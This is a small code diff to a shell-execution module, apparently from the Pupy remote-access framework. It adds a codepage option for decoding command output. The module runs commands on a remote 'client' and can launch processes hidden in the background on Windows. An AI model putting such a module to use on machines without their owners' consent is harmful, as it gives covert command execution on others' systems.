@@ -16,10 +16,11 @@ class ShellExec(PupyModule):
         self.arg_parser.add_argument('-s', '--shell', help="default to /bin/sh on linux or cmd.exe on windows")
         self.arg_parser.add_argument('argument', help='use unix like syntax and put simple quotes if there is multiple arguments')
         self.arg_parser.add_argument('-H', '--hide', action='store_true', help='launch process on background (only for windows)')
+        self.arg_parser.add_argument('-c', '--codepage', default=None, help='decode using codepage')
 
     def run(self, args):
         if not args.hide:
-            self.log(shell_exec(self.client, args.argument, shell=args.shell))
+            self.log(shell_exec(self.client, args.argument, shell=args.shell, encoding=args.codepage))
         elif args.hide and self.client.is_windows():
             try:
                 self.client.load_package("pupwinutils.processes")
